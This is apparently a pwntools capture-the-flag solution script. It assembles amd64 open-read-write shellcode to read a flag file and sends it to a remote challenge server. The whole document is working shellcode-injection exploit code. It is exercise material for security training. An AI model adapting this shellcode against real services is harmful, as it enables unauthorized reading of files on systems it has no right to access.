from pwn import *
context.arch='amd64'
payload = shellcraft.amd64.linux.open('/home/orw/flag')
payload += shellcraft.amd64.linux.read('rax', 'rsp', 100)
payload += shellcraft.amd64.linux.write(1, 'rsp', 100)
payload += shellcraft.amd64.linux.exit(0)
payload = asm(payload)
#print(payload)
r = remote('csie.ctf.tw', 10124)
r.sendline(payload)
time.sleep(0.5)
print(r.recv())
r.close()
